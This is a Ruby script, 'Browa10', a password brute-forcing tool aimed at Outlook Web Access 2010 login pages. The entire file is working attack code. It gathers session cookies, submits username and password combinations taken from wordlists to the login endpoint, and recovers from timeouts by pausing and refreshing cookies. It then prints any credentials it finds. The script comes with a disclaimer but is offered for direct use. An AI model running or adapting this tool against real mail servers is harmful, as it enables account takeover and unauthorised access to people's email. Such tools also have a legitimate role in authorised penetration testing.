#!/usr/bin/ruby

# Browa10: Bruteforce script for OWA (Outlook Web Access) 2010
# (c) 2012 - Michael Hendrickx (me@michaelhendrickx.com)
# Licensed under GNU General Public License v3
# Get the latest version at http://michaelhendrickx.com/tools
#
# Please use this script responsibly, the author will not be held liable for 
# a third party's use (or misuse) of this information/script in any way. 

require 'net/http'
require 'uri'
require "getopt/std"

@url = ""
@cookie = nil

def req(username, password)
  url = URI.parse("#{@url}/auth.owa")
  request = Net::HTTP::Post.new(url.path)
  request.set_form_data({'destination'=>@url, 'flags'=>'1', 'forcedownlevel' => '0', 'trusted' => '0',
                         'username' => username, 'password' => password, 'isUtf8' => "1" })
  request["Cookie"] = @cookie 
  http = Net::HTTP.new(url.host, url.port)
  http.use_ssl = true
  res = http.start { |http| http.request(request) }  
  res.response["Location"].casecmp(@url).eql?(0)? true : false
end

def getcookies # om nom nom
  url = URI.parse(@url)  
  request = Net::HTTP::Get.new(url.path, { "Content-Type" => "text/html" })
  http = Net::HTTP.new(url.host, url.port)
  http.use_ssl = true
  res = http.start { |http| http.request(request) }  
  @cookie = res.response['set-cookie'] 

  # get the outlook session
  url = URI.parse(@url + "/auth/logon.aspx?url=" + @url)  
  request = Net::HTTP::Get.new(url.request_uri, { "Content-Type" => "text/html" })
  request["Cookie"] = @cookie.to_s
  http = Net::HTTP.new(url.host, url.port)
  http.use_ssl = true
  res = http.start { |http| http.request(request) }
  @cookie = @cookie.to_s + "; " + res.response['set-cookie'] + "; owacsdc=1; PBack=0; tzid=Arab Standard Time"
end

def printopts
  puts "usage: #{$0} [options] https://<target>/OWA\n\n"
  puts "  -u <username> : single username mode"
  puts "  -p <password> : single password mode"
  puts "  -l <filename> : try list containing username:password combinations"
  puts "  -U <filename> : list containing usernames"
  puts "  -P <filename> : list containing passwords"
  puts "  -t <timeout>  : delay between requests in seconds (default: 2)"
  puts "  -b            : break as soon as a valid combination is found"
  puts "  -v            : verbose mode"
  puts "  -h            : help; this screen"
  puts "\n"
  exit
end

# massage the target to a correct form: http(s) prefix and /owa suffix  
def checktarget(target, ssl)
  target = target.downcase
  target = "https://#{target}" unless target.match(/^https/)
  target = "#{target}/OWA" unless target.match(/\/owa$/)
  target
end

puts "Browa10: bruteforce OWA 2010 script"
puts "------( http://michaelhendrickx.com/tools )-\n\n"

# starts from here
printopts() if ARGV.empty?
opt = Getopt::Std.getopts("u:p:l:U:P:t:svbh")
printopts() if opt["u"].nil? && opt["U"].nil? && opt["l"].nil?
@url = checktarget(ARGV[ARGV.size-1], !opt["s"].nil?)
puts " + checking #{@url} at #{Time.now}"

# good enough, let's go

usernames = []
passwords = []
usernames.push opt["u"] if opt["u"]
passwords.push opt["p"] if opt["p"]
if opt["U"]
  begin
    f = File.open(opt["U"])
    f.each_line{ |line| usernames.push(line.strip) }
  rescue
    puts " + Error: can't open file #{opt["U"]}\n\n"
    exit
  end
end
if opt["P"]
  begin
    f = File.open(opt["P"])
    f.each_line{ |line| passwords.push(line.strip) }
  rescue
    puts " + Error: can't open file #{opt["P"]}\n\n"
    exit
  end
end
if opt["l"]
  begin
    f = File.open(opt["l"])
    f.each_line{ |line| 
      (u, p) = line.strip.split(":")
      usernames.push(u); passwords.push(p);
    }
  rescue
    puts " + Error: can't open file #{opt["l"]}\n\n"
    exit
  end
end

getcookies()
usernames.each do |username|
  username = username.strip
  if opt["l"] # do a 1 to 1 username/password run
    index = usernames.index(username)
    password = passwords[index].strip
    begin 
      puts " + trying #{username} / #{password}" if opt["v"] 
      if req(username, passwords[index])
        puts " + found: ( #{username} / #{password} )" 
        break if opt["b"]
      end
    rescue
      # timeout happened
      puts " ! timeout happened on #{username} / #{passwords} - sleeping for 60 seconds"
      sleep 60
      getcookies()
    end     

  else # try all usernames with all passwords

    passwords.each do |password|
      begin 
        puts " + trying #{username} / #{password}" if opt["v"] 
        if req(username, password)
          puts " + found: ( #{username} / #{password} )" 
          break if opt["b"]
        end
      rescue
        # timeout happened
        puts " ! timeout happened on #{username} / #{password} - sleeping for 60 seconds"
        sleep 60
        getcookies()
      end
    end # pws
  end
  sleep opt["t"].to_i || 2

end
puts "\n"


